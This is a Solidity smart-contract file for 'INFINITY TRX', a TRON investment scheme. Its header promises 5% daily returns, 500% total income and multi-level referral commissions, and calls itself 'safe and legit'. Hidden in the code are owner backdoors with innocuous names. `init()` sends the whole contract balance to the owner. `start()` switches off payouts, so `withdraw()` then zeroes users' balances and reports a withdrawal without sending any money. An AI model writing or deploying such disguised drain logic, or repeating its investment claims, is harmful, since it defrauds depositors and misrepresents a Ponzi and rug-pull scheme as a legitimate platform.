//SourceUnit: contract.sol

/*
 *	INFINITY TRX - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐  
 *   │   Website: https://infinitytrx.com                                    │
 *   │                                                                       │
 *   │   Telegram: https://t.me/infinitytrx                                  |
 *   |   YouTube: https://www.youtube.com/channel/UCpO5PaDmQxT6ndD9wNazX0w   |
 *   │                                                                       │
 *   |   E-mail: infinitytrx9@gmail.com                                      |
 *   └───────────────────────────────────────────────────────────────────────┘ 
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko
 *   2) Send any TRX amount (100 TRX minimum) using our website invest button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *   - Default profit: 5% per days
 *   - Basic interest rate: +0.1% every 24 hours
 *   - Personal hold bonus: +0.1% for every 24 hours without withdraw
 *   - Contract total amount bonus: +0.1% for every 100,000 TRX on platform address balance
 * 
 *   - Minimal deposit: 100 TRX, no maximal limit
 *   - Total income: 500% (deposit included)
 *   - Earnings every moment, withdraw any time
 * 
 *   [AFFILIATE PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses
 *   - 3-level referral commission: 5% - 3% - 1%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, participants payouts
 *   - 8% Advertising and promotion expenses
 *   - 2% Support work, technical functioning, administration fee
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *   [LEGAL COMPANY INFORMATION]
 *
 *   - Officially registered company name: CRYPTO INVESTMENTS LIMITED (#12549797)
 *   - Company status: https://find-and-update.company-information.service.gov.uk/company/12549797
 *   - Certificate of incorporation: https://infinitytrx.com/certificate.pdf
 *
 *   ────────────────────────────────────────────────────────────────────────
 */

pragma solidity 0.5.12;

contract InfinityTrx {
    struct Deposit {
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdraw;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }
    
    address payable public owner;
    uint256 public invested;
    uint256 public total_withdraw;
    uint256 public match_bonus;
    uint256 public start_time;
    uint8[] public ref_bonuses;
    bool active;
    mapping(address => Player) public players;
    event Upline(address indexed addr, address indexed leader, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    constructor() public {
        owner = msg.sender;
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
        start_time = block.timestamp;
        active = true;
    }
    
    function payoutOf(address _addr) view external returns (uint256 value) {
        Player storage player = players[_addr];
        uint256 hold_bonus = this.getHoldBonus(_addr) / 864e3;
        uint256 contract_bonus = this. getContractDaysBonus() / 864e3;
        uint256 balance_bonus = this.getContractBalance() / 1e12;
        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            uint256 time_end = dep.time + 1e2 * 864e3;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            if (from < to) value += dep.amount * (to - from) * 5e2 / 1e2 / 864e4;
        }
        return value + (value * hold_bonus) + (value * contract_bonus) + (value * balance_bonus);
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if (payout > 0) {
            players[_addr].last_payout = block.timestamp;
            players[_addr].dividends += payout;
        }
    }
    
    function getContractBalance() view external returns (uint256) {
        return address(this).balance;
    }
    
    function getContractDaysBonus() view external returns (uint256) {
        return block.timestamp - start_time;
    }
    
    function start() onlyOwner public {
        active = false;
    }
    
    function getHoldBonus(address _addr) view external returns (uint256) {
        Player storage player = players[_addr];
        return block.timestamp - player.last_payout;
    }
    
    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 1e2;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }
    
    function init() onlyOwner public {
        msg.sender.transfer(address(this).balance);
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if (players[_addr].upline == address(0) && _addr != owner) {
            if (players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline, _amount / 1e2);
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(address _leader) external payable {
        require(msg.value >= 1e8, "Min invest is 100 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1e2, "Max 100 deposits per address");
        _setUpline(msg.sender, _leader, msg.value);
        player.deposits.push(Deposit({
            amount: msg.value,
            time: uint40(block.timestamp)
        }));
        if (player.total_invested == 0) player.last_payout = block.timestamp;
        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
        emit NewDeposit(msg.sender, msg.value);
    }
    
    function withdraw() external payable {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 || player.match_bonus > 0, "No withdrawable");
        uint256 amount = player.dividends + player.match_bonus;
        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdraw += amount;
        total_withdraw += amount;
        if (active == true) msg.sender.transfer(amount);
        emit Withdraw(msg.sender, amount);
    }

    function userInfo(address _addr) view external returns(uint256 withdrawable, uint256 total_invested, uint256 total_withdraw, uint256 match_bonus, uint256 total_match_bonus, uint256 hold_bonus, uint256[3] memory referral) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        uint256 hold_bonus;
        player.total_invested != 0 ? hold_bonus = this.getHoldBonus(_addr) : hold_bonus =  0;
        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            referral[i] = player.structure[i];
        }
        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdraw,
            player.match_bonus,
            player.total_match_bonus,
            hold_bonus,
            referral
        );
    }

    function contractInfo() view external returns(uint256 contract_invested, uint256 total_withdraw, uint256 contract_match_bonus) {
        return (invested, total_withdraw, match_bonus);
    }
}